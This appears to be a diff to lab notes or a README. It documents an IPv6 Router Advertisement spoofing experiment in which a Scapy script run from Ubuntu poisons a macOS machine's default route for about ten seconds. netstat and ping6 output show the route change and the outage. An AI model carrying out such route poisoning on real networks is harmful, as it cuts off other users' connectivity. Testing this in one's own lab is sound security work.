@@ -153,3 +153,51 @@ hexdump(pkt)
 # Send packet once (change count and inter if you want multiple)
 sendp(pkt, iface=IFACE, count=1, inter=0.2, verbose=True)
 ```
+
+I seem to be able to poision the Routing Table of my macOS for 10 seconds causing a DDOS for IPv6.
+
+- Default Route on my macOS
+
+```bash
+$ netstat -nr -f inet6 | grep default | grep en0
+default                                 fe80::e83:ccff:fefb:a107%en0            UGcg                  en0
+```
+
+- Executing the script on my Ubuntu
+
+```bash
+(venv) gus@ubuntu:~$ sudo $(which python3) ipv6_icmpv6_ra1.py
+```
+
+- The Default Route on my macOS changes for approx 10 seconds
+
+```bash
+$ netstat -nr -f inet6 | grep default | grep en0
+default                                 fe80::221:11ff:fe33:4455%en0            UGcg                  en0
+```
+
+- And during those 10 seconds ping6 to the Internet stopped working as can be seen here the gap from `icmp_seq=10` to `icmp_seq=19`.
+
+```bash
+$ ping6 2001:4860:4860::8888
+PING6(56=40+8+8 bytes) 2602:61:71e7:b501:290c:4492:68fb:54c3 --> 2001:4860:4860::8888
+16 bytes from 2001:4860:4860::8888, icmp_seq=0 hlim=117 time=27.913 ms
+16 bytes from 2001:4860:4860::8888, icmp_seq=1 hlim=117 time=23.264 ms
+16 bytes from 2001:4860:4860::8888, icmp_seq=2 hlim=117 time=31.688 ms
+16 bytes from 2001:4860:4860::8888, icmp_seq=3 hlim=117 time=23.628 ms
+16 bytes from 2001:4860:4860::8888, icmp_seq=4 hlim=117 time=19.896 ms
+16 bytes from 2001:4860:4860::8888, icmp_seq=5 hlim=117 time=19.655 ms
+16 bytes from 2001:4860:4860::8888, icmp_seq=6 hlim=117 time=17.982 ms
+16 bytes from 2001:4860:4860::8888, icmp_seq=7 hlim=117 time=22.072 ms
+16 bytes from 2001:4860:4860::8888, icmp_seq=8 hlim=117 time=17.466 ms
+16 bytes from 2001:4860:4860::8888, icmp_seq=9 hlim=117 time=14.706 ms
+16 bytes from 2001:4860:4860::8888, icmp_seq=10 hlim=117 time=20.411 ms
+
+
+
+16 bytes from 2001:4860:4860::8888, icmp_seq=19 hlim=117 time=24.447 ms
+16 bytes from 2001:4860:4860::8888, icmp_seq=20 hlim=117 time=25.626 ms
+16 bytes from 2001:4860:4860::8888, icmp_seq=21 hlim=117 time=20.598 ms
+16 bytes from 2001:4860:4860::8888, icmp_seq=22 hlim=117 time=19.692 ms
+16 bytes from 2001:4860:4860::8888, icmp_seq=23 hlim=117 time=20.899 ms
+```
